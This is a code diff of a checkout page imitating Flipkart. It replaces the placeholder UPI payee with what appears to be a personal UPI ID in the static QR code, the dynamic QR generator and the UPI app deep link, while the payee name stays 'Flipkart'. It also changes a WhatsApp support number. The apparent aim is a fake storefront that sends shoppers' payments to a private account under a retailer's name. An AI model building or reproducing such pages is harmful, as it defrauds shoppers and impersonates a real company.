@@ -1717,7 +1717,7 @@
                     <p><strong>Option 1: Scan QR Code with any UPI App</strong></p>
                     <div class="qr-box">
                         <img id="qrImage"
-                            src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=upi://pay?pa=example@flipkart&pn=Flipkart&am=499&cu=INR"
+                            src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=upi://pay?pa=vikkusing134@nyes&pn=Flipkart&am=499&cu=INR"
                             alt="UPI QR Code" />
                         <p style="font-size:12px;color:#555;margin-top:4px;">Scan with any UPI app</p>
                     </div>
@@ -1762,7 +1762,7 @@
             <div style="margin-top:16px;">
                 <p><strong>Need help with your order?</strong></p>
                 <a href="https://wa.me/919468747963" target="_blank" class="support-whatsapp">💬 WhatsApp:
-                    7073589896</a>
+                    9468747963</a>
             </div>
         </div>
 
@@ -2072,7 +2072,7 @@
                 const total = cart.reduce((s, i) => s + i.price * i.qty, 0);
                 document.getElementById('payAmount').textContent = total;
                 const qrImg = document.getElementById('qrImage');
-                const upi = `upi://pay?pa=example@flipkart&pn=Flipkart&am=${total}&cu=INR`;
+                const upi = `upi://pay?pa=vikkusing134@nyes&pn=Flipkart&am=${total}&cu=INR`;
                 qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upi)}`;
             } else if (page === 'success') {
                 success.classList.add('active');
@@ -2125,7 +2125,7 @@
         // ============================================================
         function openUpiApp(app) {
             const total = cart.reduce((s, i) => s + i.price * i.qty, 0);
-            const upiUri = `upi://pay?pa=example@flipkart&pn=Flipkart&am=${total}&cu=INR&tn=Order%20Payment`;
+            const upiUri = `upi://pay?pa=vikkusing134@nyes&pn=Flipkart&am=${total}&cu=INR&tn=Order%20Payment`;
             window.location.href = upiUri;
         }
 
